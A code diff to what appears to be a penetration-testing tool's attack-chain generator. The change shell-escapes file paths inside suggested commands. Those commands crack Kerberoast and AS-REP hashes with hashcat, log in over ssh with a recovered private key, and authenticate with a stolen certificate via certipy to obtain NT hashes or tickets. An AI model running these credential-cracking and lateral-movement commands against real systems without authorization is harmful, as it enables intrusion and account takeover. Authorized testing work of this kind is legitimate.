@@ -671,7 +671,8 @@ def run(report, store, ui=None):
         s, l = e.tgs_src
         # iter-80: use the real path to the hash file so operator doesn't
         # have to extract the TGS blob into a separate tgs.txt file first.
-        _tgs_path = s if s else "tgs.txt"
+        # iter-147: shell-escape the path against ' in the source name.
+        _tgs_path = _sh_sq(s if s else "tgs.txt")
         chains.append(Chain("R10", "crack TGS", "Kerberoast TGS hash present",
             crit=4, conf=0.8, ready=0.7, prox=0.6,
             commands=[f"hashcat -m 13100 '{_tgs_path}' rockyou.txt -r best64.rule"],
@@ -713,7 +714,8 @@ def run(report, store, ui=None):
     if e.has_asrep:
         s, l = e.asrep_src
         # iter-80: same path threading for the AS-REP cracker.
-        _asrep_path = s if s else "asrep.txt"
+        # iter-147: shell-escape.
+        _asrep_path = _sh_sq(s if s else "asrep.txt")
         chains.append(Chain("R12", "crack AS-REP", "AS-REP hash present",
             crit=4, conf=0.8, ready=0.7, prox=0.6,
             commands=[f"hashcat -m 18200 '{_asrep_path}' rockyou.txt"],
@@ -750,7 +752,7 @@ def run(report, store, ui=None):
         # 'chmod 600 /loot/id_rsa; ssh -i /loot/id_rsa <user>@target'
         # ready to paste. src is guaranteed set when has_pkey fired (see
         # _entities()); fall back to placeholder for defensive safety.
-        _kf = s if s else "<keyfile>"
+        _kf = _sh_sq(s if s else "<keyfile>")
         chains.append(Chain("R17", "ssh key", "private key recovered",
             crit=6, conf=0.7, ready=1.3, prox=_prox(store, sh),
             commands=[f"chmod 600 '{_kf}'; ssh -i '{_kf}' <user>@{sh}",
@@ -767,7 +769,7 @@ def run(report, store, ui=None):
         # iter-71: use the actual .pfx source path instead of '<file.pfx>' so
         # the operator gets a ready-to-run command. Fall back to placeholder
         # when src looks empty/generic.
-        _pfx_path = s if s and s.lower().endswith((".pfx", ".p12")) else "<file.pfx>"
+        _pfx_path = _sh_sq(s if s and s.lower().endswith((".pfx", ".p12")) else "<file.pfx>")
         chains.append(Chain("R16", "AD CS cert", "PKCS#12 cert/key (certipy -> NT hash/TGT)",
             crit=8, conf=0.8, ready=1.4, prox=0.85,        # score 7.62
             commands=[f"certipy auth -pfx '{_pfx_path}' -password '<pfx-password-if-set>' -dc-ip {dc()}",
@@ -784,8 +786,8 @@ def run(report, store, ui=None):
         # iter-71: use the actual ticket file path instead of the placeholder
         # so the operator can paste the export line directly. Accepts .ccache,
         # .kirbi, and krb5cc_* files (all valid impacket ticket formats).
-        _ccache_path = s if s and (s.lower().endswith((".ccache", ".kirbi"))
-                                    or "krb5cc" in s.lower()) else "<ticket.ccache>"
+        _ccache_path = _sh_sq(s if s and (s.lower().endswith((".ccache", ".kirbi"))
+                                          or "krb5cc" in s.lower()) else "<ticket.ccache>")
         # iter-108: quote the URI for shell safety - dom/user@fqdn could
         # carry $ or other special chars in either half. impacket accepts
         # quoted or unquoted; quoting is safer.
